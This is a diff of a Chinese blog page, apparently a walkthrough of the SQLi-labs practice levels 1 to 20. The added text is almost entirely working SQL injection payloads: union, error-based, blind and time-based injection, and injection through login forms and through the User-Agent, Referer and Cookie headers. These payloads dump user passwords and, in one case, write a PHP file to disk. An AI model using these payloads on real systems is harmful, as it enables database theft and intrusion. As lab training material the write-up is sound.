@@ -24,7 +24,7 @@
 <meta property="og:description" content="第一关?id&#x3D;1 (回显正常)?id&#x3D;1’回显错误) 可以判断出是基于单引号注入然后and判断一下?id&#x3D;1’and 1&#x3D;1 (回显正常)?id&#x3D;1’and 1&#x3D;2 回显错误证明存在注入漏洞则or 相反?id&#x3D;1’or 1&#x3D;2 –+ （回显正常）?id&#x3D;1’or 1&#x3D;1 –+ （回显错误，证明存在注">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-03-24T08:35:20.000Z">
-<meta property="article:modified_time" content="2022-03-26T00:28:52.678Z">
+<meta property="article:modified_time" content="2022-03-31T13:06:56.578Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
@@ -197,7 +197,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.8k 字
+      9.4k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      24 分钟
+      79 分钟
     </span>
   
 
@@ -249,6 +249,65 @@
               <p>第一关<br>?id&#x3D;1 (回显正常)<br>?id&#x3D;1’回显错误) 可以判断出是基于单引号注入然后and判断一下<br>?id&#x3D;1’and 1&#x3D;1 (回显正常)<br>?id&#x3D;1’and 1&#x3D;2 回显错误证明存在注入漏洞<br>则or 相反<br>?id&#x3D;1’or 1&#x3D;2 –+ （回显正常）<br>?id&#x3D;1’or 1&#x3D;1 –+ （回显错误，证明存在注入漏洞）<br>然后判断列数<br>?id&#x3D;1’ order by 3 –+（没报错）<br>?id&#x3D;1’ order by 4 –+ （报错）<br>联合查询一下<br>?id&#x3D;1’and 1&#x3D;2 union select 1,2,3 –+<br>基于上述的简单联合查询<br>进行爆表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata –+<br>基于上述进行爆表进行爆security库内的表<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;”security” –+<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;”users” –+<br>爆字段里面的数据<br>?id&#x3D;1’and 1&#x3D;2 union select 1,group_concat(username,0x5c,password),3 from  users –+   </p>
 <p>第二关<br>1.判断注入类型：<br>?id&#x3D;1 正常<br>?id&#x3D;1’异常<br>?id&#x3D;1’–+ 异常<br>由此判断为整型注入<br>2.判断字段数：<br>?id&#x3D;1 order by 3 正常<br>?id&#x3D;1 order by 4 异常<br>判断字段数为3<br>3.爆数据库名<br>?id&#x3D;-1 union select 1,database(),3<br>可以查询到数据库名为security<br>4.爆表名<br>?id&#x3D;-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;’security’),3<br>由此获得security的四个表，emails，referers,uagents,users<br>5.爆字段名<br>?id&#x3D;-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’and table_name&#x3D;’users’),3<br>获得表users的三个字段名，id，username，password<br>6.取数据<br>?id&#x3D;-1 union select 1,(select group_concat(id,username,password)from users),3</p>
 <p>第三关<br>?id&#x3D;1 (回显正常)<br>?id&#x3D;1’(回显错误)<br>?id&#x3D;1”(回显正常) 输入单引号页面异常，输入双引号页面正常显示。但是从回显的信息看来，它是由’)来进行闭合的，所以我们尝试输入’)进行闭合再输入–+注释掉后面的代码，结果显示页面正常显示。由此可推出参数是’)进行闭合的！此时可以输入and 1&#x3D;1 和and 1&#x3D;2来比较<br>查看当前数据库名和当前数据库版本<br>?id&#x3D;1’) and 1&#x3D;1 –+<br>?id&#x3D;1’) and 1&#x3D;2 –+<br>?id&#x3D;1’) order by 3 –+<br>?id&#x3D;1’) order by 4 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,2,3 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,database(),version()–+<br>通过information_schema数据库中的tables表来查询当前数据库的所有表<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 0,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 1,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 2,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,table_name,3 from information_schema.tables where table_schema&#x3D;database() limit 3,1 –+<br>查询一下这张表有什么字段<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 1,1 –+<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,column_name,3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 2,1 –+<br>获得表的所有信息<br>?id&#x3D;1’) and 1&#x3D;2 union select 1,username,password from users limit 0,1 –+</p>
+<p>Less4<br>id&#x3D;-1”) union select 1,2,database()–<br>id&#x3D;-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+<br>id&#x3D;-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+<br>id&#x3D;-1”) union select 1,2,group_concat(username,’-‘,password) from security.users–+</p>
+<p>less5<br>基于’ 字符的错<br>id&#x3D;1’ union select updatexml(1,concat(0x7e,(select user()),0x7e),1) – -</p>
+<p>less6<br>基于”字符的错<br>id&#x3D;1” union select updatexml(1,concat(0x7e,(select user()),0x7e),1) – -</p>
+<p>less7<br>1’)) union select 1,’‘,3 into outfile ‘D:&#x2F;&#x2F;1.php’ – -</p>
+<p>less8<br>基于’布尔盲注<br>判断数据库名长度：id&#x3D;1’ and length(database())&gt;7–+<br>id&#x3D;1’ and ascii(substr(database(),1,1))&gt;100–+</p>
+<p>id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100–+</p>
+<p>id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100–+</p>
+<p>id&#x3D;1’ and ascii(substr((select password from security.users limit 0,1),1,1))&gt;100–+</p>
+<p>less9<br>基于’字符的时间盲注<br>判断数据库名长度：id&#x3D;1’ and if(length(database())&gt;7, 0, sleep(5))–+<br>id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1’ and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>less10<br>基于”字符的时间盲注<br>判断数据库名长度：id&#x3D;1” and if(length(database())&gt;8, 0, sleep(5))–+</p>
+<p>id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1” and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1” and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>id&#x3D;1” and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))–+</p>
+<p>less11<br>post注入<br>-admin’ union select 1,database()– -</p>
+<p>-admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’– -</p>
+<p>-admin’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’– -</p>
+<p>-admin’ union select 1,group_concat(username,’-‘,password) from security.users– -</p>
+<p>less12<br>“）post注入<br>-admin”) union select 1,database()– -</p>
+<p>-admin”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’– -</p>
+<p>-admin”) union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’– -</p>
+<p>-admin”) union select 1,group_concat(username,’-‘,password) from security.users– -</p>
+<p>less13<br>‘)报错注入</p>
+<p>admin’) union select updatexml(1,concat(0x7e,(database()),0x7e),1) – -</p>
+<p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p>
+<p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p>
+<p>admin’) union select updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1)– -</p>
+<p>less14<br>“的报错注入<br>admin” union select updatexml(1,concat(0x7e,(database()),0x7e),1) – -</p>
+<p>admin” union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p>
+<p>admin” union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p>
+<p>admin” union select updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1)– -</p>
+<p>less15<br>post时间注入<br>admin’ and if(length(database())&gt;7, 0, sleep(5))– -<br>暴库payload：admin’ and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin’ and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin’ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin’ and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>less16<br>post时间注入<br>判断数据库名长度：admin”) and if(length(database())&gt;8, 0, sleep(5))– -</p>
+<p>admin”) and if(ascii(substr(database(),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin”) and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin”) and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>admin”) and if(ascii(substr((select password from security.users limit 0,1),1,1))&gt;100, 0, sleep(5))– -</p>
+<p>less17<br>‘的post报错注入<br>admin’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)– -</p>
+<p>admin’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1)– -</p>
+<p>admin’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1)– -</p>
+<p>admin’ and updatexml(1,concat(0x7e,(select password from (select password from users where username&#x3D;’admin’) mingzi ),0x7e),1)– -</p>
+<p>less18<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文User-Agent:后加入注入语句<br>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#</p>
+<p>less19<br>报头注入<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文Referer:后加入注入语句<br>‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),0x7e),1))#</p>
+<p>‘,1,updatexml(1,concat(0x7e,(select group_concat(username,’-‘,password) from security.users),0x7e),1))#</p>
+<p>less20<br>基于’的Cookie:报头文报错注入<br>用Burp抓取输入正确用户密码的登录页面,然后在报头文Cookie:后加入注入语句<br>uname&#x3D;-admin’ union select 1,2,database()–+</p>
+<p>uname&#x3D;-admin’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+</p>
+<p>uname&#x3D;-admin’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p>
+<p>uname&#x3D;-admin’ union select 1,2,group_concat(username,’-‘,password) from security.users–+</p>
 
             </div>
             <hr>
